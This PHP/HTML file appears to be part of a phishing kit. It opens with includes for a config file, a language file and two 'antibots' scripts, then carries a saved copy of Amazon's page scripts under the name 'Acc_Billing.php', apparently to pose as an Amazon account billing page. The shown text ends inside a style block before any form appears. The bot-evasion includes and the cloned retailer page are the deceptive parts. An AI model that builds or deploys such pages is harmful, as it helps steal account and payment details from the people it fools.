<?php

session_start();
include('__CONFIG__.php');
include 'bahasa.php';
include "anti/antibots.php";
include "anti/antibots2.php";

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/FontAwesome/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="Library/Bootstrap/css/main.min.css">
    <link rel="stylesheet" href="Sheets/alert.css">
    <link rel="stylesheet" href="Sheets/accbilling.css">
    <link rel="shortcut icon" href="Assets/img/favicon.ico" />
    <title><?php echo $acyba; ?></title>
</head>

<!DOCTYPE html>
<!-- saved from url=(0067)Acc_Billing.php -->
<html lang="en-us" class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.20.4-2020-05-01"><!-- sp:feature:head-start --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src="./Library/files/31BVuidgT8L.js.download" crossorigin="anonymous"></script><script>var aPageStart = (new Date()).getTime();</script>
<script type="text/javascript">var ue_t0=ue_t0||+new Date();</script><!-- sp:feature:cs-optimization -->
<meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://images-na.ssl-images-amazon.com/" crossorigin=""><link rel="preconnect" href="https://images-na.ssl-images-amazon.com/" crossorigin=""><link rel="dns-prefetch" href="https://m.media-amazon.com/" crossorigin=""><link rel="preconnect" href="https://m.media-amazon.com/" crossorigin=""><link rel="dns-prefetch" href="https://completion.amazon.com/" crossorigin=""><link rel="preconnect" href="https://completion.amazon.com/" crossorigin=""><script data-dapp-detection="">
(function() {
  let alreadyInsertedMetaTag = false

  function __insertDappDetected() {
    if (!alreadyInsertedMetaTag) {
      const meta = document.createElement('meta')
      meta.name = 'dapp-detected'
      document.head.appendChild(meta)
      alreadyInsertedMetaTag = true
    }
  }

  if (window.hasOwnProperty('web3')) {
    // Note a closure can't be used for this var because some sites like
    // www.wnyc.org do a second script execution via eval for some reason.
    window.__disableDappDetectionInsertion = true
    // Likely oldWeb3 is undefined and it has a property only because
    // we defined it. Some sites like wnyc.org are evaling all scripts
    // that exist again, so this is protection against multiple calls.
    if (window.web3 === undefined) {
      return
    }
    __insertDappDetected()
  } else {
    var oldWeb3 = window.web3
    Object.defineProperty(window, 'web3', {
      configurable: true,
      set: function (val) {
        if (!window.__disableDappDetectionInsertion)
          __insertDappDetected()
        oldWeb3 = val
      },
      get: function () {
        if (!window.__disableDappDetectionInsertion)
          __insertDappDetected()
        return oldWeb3
      }
    })
  }
})()</script><script type="text/javascript">
window.ue_ihb = (window.ue_ihb || window.ueinit || 0) + 1;
if (window.ue_ihb === 1) {

var ue_csm = window,
    ue_hob = +new Date();
(function(d){var e=d.ue=d.ue||{},f=Date.now||function(){return+new Date};e.d=function(b){return f()-(b?0:d.ue_t0)};e.stub=function(b,a){if(!b[a]){var c=[];b[a]=function(){c.push([c.slice.call(arguments),e.d(),d.ue_id])};b[a].replay=function(b){for(var a;a=c.shift();)b(a[0],a[1],a[2])};b[a].isStub=1}};e.exec=function(b,a){return function(){try{return b.apply(this,arguments)}catch(c){ueLogError(c,{attribution:a||"undefined",logLevel:"WARN"})}}}})(ue_csm);


    var ue_err_chan = 'jserr-rw';
(function(d,e){function h(f,b){if(!(a.ec>a.mxe)&&f){a.ter.push(f);b=b||{};var c=f.logLevel||b.logLevel;c&&c!==k&&c!==m&&c!==n&&c!==p||a.ec++;c&&c!=k||a.ecf++;b.pageURL=""+(e.location?e.location.href:"");b.logLevel=c;b.attribution=f.attribution||b.attribution;a.erl.push({ex:f,info:b})}}function l(a,b,c,e,g){d.ueLogError({m:a,f:b,l:c,c:""+e,err:g,fromOnError:1,args:arguments},g?{attribution:g.attribution,logLevel:g.logLevel}:void 0);return!1}var k="FATAL",m="ERROR",n="WARN",p="DOWNGRADED",a={ec:0,ecf:0,
pec:0,ts:0,erl:[],ter:[],mxe:50,startTimer:function(){a.ts++;setInterval(function(){d.ue&&a.pec<a.ec&&d.uex("at");a.pec=a.ec},1E4)}};l.skipTrace=1;h.skipTrace=1;h.isStub=1;d.ueLogError=h;d.ue_err=a;e.onerror=l})(ue_csm,window);


var ue_id = 'YF5GA687BG8W5SSXJPYR',
    ue_url = '/gp/uedata',
    ue_navtiming = 1,
    ue_mid = 'ATVPDKIKX0DER',
    ue_sid = '144-6121204-6279753',
    ue_sn = 'www.amazon.com',
    ue_furl = 'fls-na.amazon.com',
    ue_surl = 'https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
    ue_int = 0,
    ue_fcsn = 1,
    ue_urt = 3,
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:144-6121204-6279753:YF5GA687BG8W5SSXJPYR$uedata=s:',
    ue_sbuimp = 1,
    ue_csa_pl = 1,

    ue_swi = 1;
function ue_viz(){(function(c,e,a){function k(b){if(c.ue.viz.length<p&&!l){var a=b.type;b=b.originalEvent;/^focus./.test(a)&&b&&(b.toElement||b.fromElement||b.relatedTarget)||(a=e[m]||("blur"==a||"focusout"==a?"hidden":"visible"),c.ue.viz.push(a+":"+(+new Date-c.ue.t0)),"visible"==a&&(ue.isl&&uex("at"),l=1))}}for(var l=0,f,g,m,n=["","webkit","o","ms","moz"],d=0,p=20,h=0;h<n.length&&!d;h++)if(a=n[h],f=(a?a+"H":"h")+"idden",d="boolean"==typeof e[f])g=a+"visibilitychange",m=(a?a+"V":"v")+"isibilityState";
k({});d&&e.addEventListener(g,k,0);c.ue&&d&&(c.ue.pageViz={event:g,propHid:f})})(ue_csm,document,window)};

(function(d,k,K){function E(a){return a&&a.replace&&a.replace(/^\s+|\s+$/g,"")}function r(a){return"undefined"===typeof a}function F(a,b){for(var c in b)b[t](c)&&(a[c]=b[c])}function G(a){try{var b=K.cookie.match(RegExp("(^| )"+a+"=([^;]+)"));if(b)return b[2].trim()}catch(c){}}function L(p,b,c){p&&(d.ue_id=a.id=a.rid=p,w=w.replace(/((.*?:){2})(\w+)/,function(a,b){return b+p}));b&&(w=w.replace(/(.*?:)(\w|-)+/,function(a,c){return c+b}),d.ue_sid=b);c&&a.tag("page-source:"+c);d.ue_fpf=w}function M(){var a=
{};return function(b){b&&(a[b]=1);b=[];for(var c in a)a[t](c)&&b.push(c);return b}}function x(d,b,c,e){e=e||+new B;var f,m,y=k.csa;if(b||r(c)){if(d){f=b?h("t",b)||h("t",b,{}):a.t;f[d]=e;for(m in c)c[t](m)&&h(m,b,c[m]);!b&&k.ue_csa_pl&&y&&y("PageTiming")("mark",Z[d]||d)}return e}}function h(d,b,c){var e=b&&b!=a.id?a.sc[b]:a;e||(e=a.sc[b]={});"id"===d&&c&&(N=1);return e[d]=c||e[d]}function O(d,b,c,e,f){c="on"+c;var h=b[c];"function"===typeof h?d&&(a.h[d]=h):h=function(){};b[c]=function(a){f?(e(a),h(a)):
(h(a),e(a))};b[c]&&(b[c].isUeh=1)}function P(p,b,c,e){function q(b,c){var d=[b],g=0,e={},f,k;c?(d.push("m=1"),e[c]=1):e=a.sc;for(k in e)if(e[t](k)){var q=h("wb",k),m=h("t",k)||{},n=h("t0",k)||a.t0,l;if(c||2==q){q=q?g++:"";d.push("sc"+q+"="+k);for(l in m)3>=l.length&&!r(m[l])&&null!==m[l]&&d.push(l+q+"="+(m[l]-n));d.push("t"+q+"="+m[p]);if(h("ctb",k)||h("wb",k))f=1}}!v&&f&&d.push("ctb=1");return d.join("&")}function m(b,c,g,e){if(b){var f=d.ue_err;d.ue_url&&!e&&b&&0<b.length&&(e=new Image,a.iel.push(e),
e.src=b,a.count&&a.count("postbackImageSize",b.length));if(w){var h=k.encodeURIComponent;h&&b&&(e=new Image,b=""+d.ue_fpf+h(b)+":"+(+new B-d.ue_t0),a.iel.push(e),e.src=b)}else a.log&&(a.log(b,"uedata",{n:1}),a.ielf.push(b));f&&!f.ts&&f.startTimer();a.b&&(f=a.b,a.b="",m(f,c,g,1))}}function y(b){var c=z?z.type:C,d=c&&2!=c,e=a.bfini;N||(e&&1<e&&(b+="&bfform=1",d||(a.isBFT=e-1)),2==c&&(b+="&bfnt=1",a.isBFT=a.isBFT||1),a.ssw&&a.isBFT&&(r(a.isNRBF)&&(c=a.ssw(a.oid),c.e||r(c.val)||(a.isNRBF=1<c.val?0:1)),
r(a.isNRBF)||(b+="&nrbf="+a.isNRBF)),a.isBFT&&!a.isNRBF&&(b+="&bft="+a.isBFT));return b}if(!a.paused&&(b||r(c))){for(var l in c)c[t](l)&&h(l,b,c[l]);x("pc",b,c);l=h("id",b)||a.id;var g=a.url+"?"+p+"&v="+a.v+"&id="+l,v=h("ctb",b)||h("wb",b),n,u;v&&(g+="&ctb="+v);1<d.ueinit&&(g+="&ic="+d.ueinit);if(!("ld"!=p&&"ul"!=p||b&&b!=l)){if("ld"==p){try{k[H]&&k[H].isUeh&&(k[H]=null)}catch(G){}if(k.chrome)for(u=0;u<I.length;u++)Q(D,I[u]);(u=K.ue_backdetect)&&u.ue_back&&u.ue_back.value++;d._uess&&(n=d._uess());
a.isl=1}a._bf&&(g+="&bf="+a._bf());d.ue_navtiming&&f&&(h("ctb",l,"1"),x("tc",C,C,J));A&&!R&&(f&&F(a.t,{na_:f.navigationStart,ul_:f.unloadEventStart,_ul:f.unloadEventEnd,rd_:f.redirectStart,_rd:f.redirectEnd,fe_:f.fetchStart,lk_:f.domainLookupStart,_lk:f.domainLookupEnd,co_:f.connectStart,_co:f.connectEnd,sc_:f.secureConnectionStart,rq_:f.requestStart,rs_:f.responseStart,_rs:f.responseEnd,dl_:f.domLoading,di_:f.domInteractive,de_:f.domContentLoadedEventStart,_de:f.domContentLoadedEventEnd,_dc:f.domComplete,
ld_:f.loadEventStart,_ld:f.loadEventEnd,ntd:("function"!==typeof A.now||r(J)?0:new B(J+A.now())-new B)+a.t0}),z&&F(a.t,{ty:z.type+a.t0,rc:z.redirectCount+a.t0}),R=1);F(a.t,{hob:d.ue_hob,hoe:d.ue_hoe});a.ifr&&(g+="&ifr=1")}x(p,b,c,e);c="ld"==p&&b&&h("wb",b);var s;c||b&&b!==l||$(b);c||l==a.oid||aa(l,(h("t",b)||{}).tc||+h("t0",b),+h("t0",b));(e=d.ue_mbl)&&e.cnt&&!c&&(g+=e.cnt());c?h("wb",b,2):"ld"==p&&(a.lid=E(l));for(s in a.sc)if(1==h("wb",s))break;if(c){if(a.s)return;g=q(g,null)}else e=q(g,null),e!=
g&&(e=y(e),a.b=e),n&&(g+=n),g=q(g,b||a.id);g=y(g);if(a.b||c)for(s in a.sc)2==h("wb",s)&&delete a.sc[s];n=0;a._rt&&(g+="&rt="+a._rt());c||(a.s=0,(n=d.ue_err)&&0<n.ec&&n.pec<n.ec&&(n.pec=n.ec,g+="&ec="+n.ec+"&ecf="+n.ecf),n=h("ctb",b),h("t",b,{}));a.tag&&a.tag().length&&(g+="&csmtags="+a.tag().join("|"),a.tag=M());s=a.viz||[];(e=s.length)&&(g+="&viz="+s.splice(0,e).join("|"));r(d.ue_pty)||(g+="&pty="+d.ue_pty+"&spty="+d.ue_spty+"&pti="+d.ue_pti);a.tabid&&(g+="&tid="+a.tabid);a.aftb&&(g+="&aftb=1");
!a._ui||b&&b!=l||(g+=a._ui());a.a=g;m(g,p,n,c)}}function $(a){var b=k.ue_csm_markers||{},c;for(c in b)b[t](c)&&x(c,a,C,b[c])}function v(a,b,c){c=c||k;if(c[S])c[S](a,b,!1);else if(c[T])c[T]("on"+a,b)}function Q(a,b,c){c=c||k;if(c[U])c[U](a,b,!1);else if(c[V])c[V]("on"+a,b)}function W(){function a(){d.onUl()}function b(a){return function(){c[a]||(c[a]=1,P(a))}}var c={},e,f;d.onLd=b("ld");d.onLdEnd=b("ld");d.onUl=b("ul");e={stop:b("os")};k.chrome?(v(D,a),I.push(a)):e[D]=d.onUl;for(f in e)e[t](f)&&O(0,
k,f,e[f]);d.ue_viz&&ue_viz();v("load",d.onLd);x("ue")}function aa(f,b,c){var e=d.ue_mbl,h=k.csa,m=h&&h("SPA"),h=h&&h("Content");e&&e.ajax&&e.ajax(b,c);m&&h&&(m("newPage",{requestId:f,transitionType:"soft"}),h("get","page")("emit","loaded"));a.tag("ajax-transition")}d.ueinit=(d.ueinit||0)+1;var a=d.ue=d.ue||{};a.t0=k.aPageStart||d.ue_t0;a.id=d.ue_id;a.url=d.ue_url;a.rid=d.ue_id;a.a="";a.b="";a.h={};a.s=1;a.t={};a.sc={};a.iel=[];a.ielf=[];a.viz=[];a.v="0.211002.0";a.paused=!1;var t="hasOwnProperty",
D="beforeunload",H="on"+D,S="addEventListener",U="removeEventListener",T="attachEvent",V="detachEvent",Z={cf:"criticalFeature",af:"aboveTheFold",fn:"functional",bb:"bodyBegin",be:"bodyEnd",ld:"loaded"},B=k.Date,A=k.performance||k.webkitPerformance,f=(A||{}).timing,z=(A||{}).navigation,J=(f||{}).navigationStart,w=d.ue_fpf,N=0,R=0,I=[],C;a.oid=E(a.id);a.lid=E(a.id);a._t0=a.t0;a.tag=M();a.ifr=k.top!==k.self||k.frameElement?1:0;a.attach=v;a.detach=Q;if("000-0000000-8675309"===d.ue_sid){var X=G("cdn-rid"),
Y=G("session-id");X&&Y&&L(X,Y,"cdn")}d.uei=W;d.ueh=O;d.ues=h;d.uet=x;d.uex=P;a.reset=L;a.pause=function(d){a.paused=d};W()})(ue_csm,window,ue_csm.document);


ue.stub(ue,"event");ue.stub(ue,"onSushiUnload");ue.stub(ue,"onSushiFlush");

ue.stub(ue,"log");ue.stub(ue,"onunload");ue.stub(ue,"onflush");
(function(c){var a=c.ue;a.cv={};a.cv.scopes={};a.count=function(d,c,b){var e={},f=a.cv,g=b&&0===b.c;e.counter=d;e.value=c;e.t=a.d();b&&b.scope&&(f=a.cv.scopes[b.scope]=a.cv.scopes[b.scope]||{},e.scope=b.scope);if(void 0===c)return f[d];f[d]=c;d=0;b&&b.bf&&(d=1);ue_csm.ue_sclog||!a.clog||0!==d||g?a.log&&a.log(e,"csmcount",{c:1,bf:d}):a.clog(e,"csmcount",{bf:d})};a.count("baselineCounter2",1);a&&a.event&&(a.event({requestId:c.ue_id||"rid",server:c.ue_sn||"sn",obfuscatedMarketplaceId:c.ue_mid||"mid"},
"csm","csm.CSMBaselineEvent.4"),a.count("nexusBaselineCounter",1,{bf:1}))})(ue_csm);



var ue_hoe = +new Date();
}
window.ueinit = window.ue_ihb;
</script>

<!-- 1ju1e3vd5jxdogr2f4y8z4lk2we1d8jl4iv07aj7pikj0jwltc --><!-- sp:feature:aui-assets -->
<link rel="stylesheet" href="./Library/files/51AZ-Jz5kmL._RC_51IB+wfP8qL.css,01evdoiemkL.css,01K+Ps1DeEL.css,31pdJv9iSzL.css,01W6EiNzKkL.css,11UGC+GXOPL.css,21LK7jaicML.css,11L58Qpo0GL.css,21kyTi1FabL.css,01ruG+gDPFL.css,01YhS3Cs-hL.css,21GwE3cR-yL.css.css">
<script>
(function(f,h,Q,G){function A(a){x&&x.tag&&x.tag(q(":","aui",a))}function u(a,b){x&&x.count&&x.count("aui:"+a,0===b?0:b||(x.count("aui:"+a)||0)+1)}function p(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function y(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function H(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function ua(a,b){var c=a.length,
e=c,g=function(){e--||(R.push(b),S||(setTimeout(T,0),S=!0))};for(g();c--;)da[a[c]]?g():(B[a[c]]=B[a[c]]||[]).push(g)}function va(a,b,c,e,g){var d=h.createElement(a?"script":"link");y(d,"error",e);g&&y(d,"load",g);a?(d.type="text/javascript",d.async=!0,c&&/AUIClients|images[/]I/.test(b)&&d.setAttribute("crossorigin","anonymous"),d.src=b):(d.rel="stylesheet",d.href=b);h.getElementsByTagName("head")[0].appendChild(d)}function ea(a,b){return function(c,e){function g(){va(b,c,d,function(b){U?u("resource_unload"):
d?(d=!1,u("resource_retry"),g()):(u("resource_error"),a.log("Asset failed to load: "+c));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(fa[c])return!1;fa[c]=!0;u("resource_count");var d=!0;return!g()}}function wa(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},logError:function(c,d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)I.hasOwnProperty(c[d])&&(g[d]=V.hasOwnProperty(c[d])?V[c[d]](I[c[d]],e):I[c[d]]);return g}function C(a,b,c,e,g){return function(d,
h){function n(){var a=null;e?a=h:"function"===typeof h&&(p.start=D(),a=h.apply(f,wa(d,k,l)),p.end=D());if(b){I[d]=a;a=d;for(da[a]=!0;(B[a]||[]).length;)B[a].shift()();delete B[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=G);b&&(d=d?d.replace(ga,""):"__NONAME__",W.hasOwnProperty(d)&&k.error(q(", reregistered by ",q(" by ",d+" already registered",W[d]),k.attribution),d),W[d]=k.attribution);for(var l=[],m=0;m<a.length;m++)l[m]=a[m].replace(ga,"");var p=ha[d||"anon"+ ++xa]={depend:l,registered:D(),
namespace:k.namespace};c?n():ua(l,k.guardFatal(d,n));return{decorate:function(a){V[d]=k.guardFatal(d,a)}}}}function ia(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:C(b,!1,a,!1,this),register:C(b,!0,a,!1,this)}}}function X(a,b){return function(c,e){e||(e=c,c=G);var g=this.attribution;return function(){z.push(b||{attribution:g,name:c,logLevel:a});var d=e.apply(this,arguments);z.pop();return d}}}function J(a,b){this.load={js:ea(this,!0),css:ea(this)};H(this,"namespace",
b);H(this,"attribution",a)}function ja(){h.body?r.trigger("a-bodyBegin"):setTimeout(ja,20)}function E(a,b){a.className=Y(a,b)+" "+b}function Y(a,b){return(" "+a.className+" ").split(" "+b+" ").join(" ").replace(/^ | $/g,"")}function ka(a){try{return a()}catch(b){return!1}}function K(){if(L){var a={w:f.innerWidth||n.clientWidth,h:f.innerHeight||n.clientHeight};5<Math.abs(a.w-Z.w)||50<a.h-Z.h?(Z=a,M=4,(a=k.mobile||k.tablet?450<a.w&&a.w>a.h:1250<=a.w)?E(n,"a-ws"):n.className=Y(n,"a-ws")):0<M&&(M--,la=
setTimeout(K,16))}}function ya(a){(L=a===G?!L:!!a)&&K()}function za(){return L}function v(a,b){return"sw:"+(b||"")+":"+a+":"}function ma(){na.forEach(function(a){A(a)})}function t(a){na.push(a)}function oa(a,b,c,e){if(c){b=p(/Chrome/i)&&!p(/Edge/i)&&!p(/OPR/i)&&!a.capabilities.isAmazonApp&&!p(new RegExp(aa+"bwv"+aa+"b"));var g=v(e,"browser"),d=v(e,"prod_mshop"),f=v(e,"beta_mshop");!a.capabilities.isAmazonApp&&c.browser&&b&&(t(g+"supported"),c.browser.action(g,e));!b&&c.browser&&t(g+"unsupported");
c.prodMshop&&t(d+"unsupported");c.betaMshop&&t(f+"unsupported")}}"use strict";var N=Q.now=Q.now||function(){return+new Q},D=function(a){return a&&a.now?a.now.bind(a):N}(f.performance),O=D(),l=f.AmazonUIPageJS||f.P;if(l&&l.when&&l.register){for(var O=[],m=h.currentScript;m;m=m.parentElement)m.id&&O.push(m.id);return l.log("A copy of P has already been loaded on this page.","FATAL",O.join(" "))}var x=f.ue;A();A("aui_build_date:3.20.4-2020-05-01");var R=[],S=!1,T;T=function(){for(var a=setTimeout(T,
0),b=N();R.length;)if(R.shift()(),50<N()-b)return;clearTimeout(a);S=!1};var da={},B={},fa={},U=!1;y(f,"beforeunload",function(){U=!0;setTimeout(function(){U=!1},1E4)});var ga=/^prv:/,W={},I={},V={},ha={},xa=0,aa=String.fromCharCode(92),F,z=[],pa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(aa,g.message,"at "+q(":",b,c,e)):G);var d=z.pop()||{};g.attribution=q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&
console&&console.log&&console.log([g.logLevel||"ERROR",a,"thrown by",g.attribution].join(" "));z=[];pa&&(d=[].slice.call(arguments),d[4]=g,pa.apply(f,d))};J.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:X(),guardFatal:X("FATAL"),
guardCurrent:function(a){var b=z[z.length-1];return b?X(b.logLevel,b).call(this,a):a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:C([],!0,!0,!0),register:C([],!0),execute:C([]),AUI_BUILD_DATE:"3.20.4-2020-05-01",when:ia(),now:ia(!0),trigger:function(a,b,c){var e=N();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&F.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new J(a)},
_namespace:function(a,b){return new J(a,b)}};var r=H(f,"AmazonUIPageJS",new J);F=r._namespace("PageJS","AmazonUI");F.declare("prv:p-debug",ha);r.declare("p-recorder-events",[]);r.declare("p-recorder-stop",function(){});H(f,"P",r);ja();if(h.addEventListener){var qa;h.addEventListener("DOMContentLoaded",qa=function(){r.trigger("a-domready");h.removeEventListener("DOMContentLoaded",qa,!1)},!1)}var n=h.documentElement,ba=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){b.style.cssText=
"background-image:-webkit-gradient(linear,left top,right bottom,from(#1E4),to(white));background-image:-webkit-linear-gradient(left top,#1E4,white);background-image:linear-gradient(left top,#1E4,white);";return~b.style.backgroundImage.indexOf("gradient")},test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){var a=!1;f.matchMedia&&(a=f.matchMedia("(-webkit-transform-3d)").matches);
return a}}}(),l=n.className,ra=/(^| )a-mobile( |$)/.test(l),sa=/(^| )a-tablet( |$)/.test(l),k={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},
dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in f&&null!==
f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return ba.testGradients()},hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;u("hiRes"+(ra?"Mobile":sa?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return ba.testTransform3d()},touchScrolling:function(){return p(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},
ios:function(){return p(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!p(/trident|Edge/i)},android:function(){return p(/android.([1-9]|[L-Z])/i)&&!p(/trident|Edge/i)},mobile:function(){return ra},tablet:function(){return sa},rtl:function(){return"rtl"===n.dir}};for(m in k)k.hasOwnProperty(m)&&(k[m]=ka(k[m]));for(var ca="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),P=0;P<ca.length;P++)k[ca[P]]=ka(function(){return ba.test(ca[P])});var L=!0,la=0,Z=
{w:0,h:0},M=4;K();y(f,"resize",function(){clearTimeout(la);M=4;K()});var ta={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};n.className=Y(n,"a-no-js");E(n,"a-js");!p(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||p(/safari/i)||E(n,"a-ember");l=[];for(m in k)k.hasOwnProperty(m)&&k[m]&&l.push("a-"+m.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));E(n,l.join(" "));n.setAttribute("data-aui-build-date",
"3.20.4-2020-05-01");r.register("p-detect",function(){return{capabilities:k,localStorage:k.localStorage&&ta,toggleResponsiveGrid:ya,responsiveGridEnabled:za}});p(/UCBrowser/i)||k.localStorage&&E(n,ta.getItem("a-font-class"));r.declare("a-event-revised-handling",!1);var w;try{w=navigator.serviceWorker}catch(a){A("sw:nav_err")}w&&(y(w,"message",function(a){a&&a.data&&u(a.data.k,a.data.v)}),w.controller&&w.controller.postMessage("MSG-RDY"));var na=[],l={reg:{},unreg:{}};l.unreg.browser={action:function(a,
b){try{w.getRegistrations().then(function(c){c.forEach(function(c){c.unregister().then(function(){u(a+"success")}).catch(function(c){r.logError(c,"[AUI SW] Failed to "+b+" service worker: ");u(a+"failure")})})})}catch(c){A("sw:api_error")}}};(function(a){var b=a.reg,c=a.unreg;w&&w.getRegistrations?(F.when("A","a-util").execute(function(a,b){oa(a,b,c,"unregister")}),y(f,"load",function(){F.when("A","a-util").execute(function(a,c){oa(a,c,b,"register");ma()})})):(b&&(b.browser&&t(v("register","browser")+
"unsupported"),b.prodMshop&&t(v("register","prod_mshop")+"unsupported"),b.betaMshop&&t(v("register","beta_mshop")+"unsupported")),c&&(c.browser&&t(v("unregister","browser")+"unsupported"),c.prodMshop&&t(v("unregister","prod_mshop")+"unsupported"),c.betaMshop&&t(v("unregister","beta_mshop")+"unsupported")),ma())})(l);r.declare("a-fix-event-off",!1);u("pagejs:pkgExecTime",D()-O)})(window,document,Date);
(function(b){function q(a,h,k){function r(a,d,c){var b=Array(h.length);~l&&(b[l]={});~m&&(b[m]=c);for(c=0;c<n.length;c++){var e=n[c],f=a[c];b[e]=f}for(c=0;c<p.length;c++)e=p[c],f=d[c],b[e]=f;a=k.apply(null,b);return~l?b[l]:a}"string"!==typeof a&&b.P.error("C001");if(!t[a]){t[a]=!0;k||(k=h,h=[]);a=a.split(":",2);var d=a[1]?a[0]:void 0,g=(a[1]||a[0]).replace(/@capability\//,"@c/"),f=d?b.P._namespace(d):b.P,u=!g.lastIndexOf("@c/",0),n=[];a=[];for(var p=[],v=[],m=-1,l=-1,d=0;d<h.length;d++){var e=h[d];
"module"===e&&f.error("C002");"exports"===e?l=d:"require"===e?m=d:e.lastIndexOf("@p/",0)?e.lastIndexOf("@c/",0)?(n.push(d),a.push("mix:"+e)):(p.push(d),v.push(e)):(n.push(d),a.push(e.substr(3)))}f.when.apply(f,a).register("mix:"+g,function(){var a=[].slice.call(arguments);return u||~m||p.length?{capabilities:v,cardModuleFactory:function(b,c){b=r(a,b,c);b.P=f;return b},require:~m?q:void 0}:r(a,[],function(){})});u&&f.when("mix:@amzn/mix.client-runtime","mix:"+g).execute(function(a,b){a.registerCapabilityModule(g,
b)});f.when("mix:"+g).register("xcp:"+g,function(a){return a});var q=function(a,b,c){try{f.when("mix:"+a[0]).execute(function(a){b(a)})}catch(d){c(d)}}}}"use strict";var t={};b.mix_d||((b.Promise?P:P.when("3p-promise")).register("@p/promise-is-ready",function(a){b.Promise=b.Promise||a}),b.mix_d=function(a,b,k){P.when("@p/promise-is-ready").execute("@p/mix-d-deps",function(){q(a,b,k)})},b.xcp_d=b.mix_d,P.when("mix:@amzn/mix.client-runtime").execute(function(a){P.declare("xcp:@xcp/runtime",a)}))})(window);
(window.AmazonUIPageJS ? AmazonUIPageJS : P).when('sp.load.js').execute(function() {
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL.js?AUIClients/AmazonUIjQuery');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/11-BZEJ8lnL._RC|61xmyjKeOpL.js,21Of0-9HPCL.js,012FVc3131L.js,11S5WBtBslL.js,51CF7BmbF2L.js,11AHlQhPRjL.js,016iHgpF74L.js,11aNYFFS5hL.js,116tgw9TSaL.js,211-p4GRUCL.js,01PoLXBDXWL.js,616HiO8WWWL.js,01ezj5Rkz1L.js,11BOgvnnntL.js,31shqoNXX9L.js,01rpauTep4L.js,01iyxuSGj4L.js,01ca4SHADSL.js_.js?AUIClients/AmazonUI');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/51s75BysibL.js?AUIClients/CardJsRuntimeBuzzCopyBuild');
});
</script>
<!-- sp:feature:cookie-consent-assets -->
<!-- sp:feature:nav-inline-css -->
<style>.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
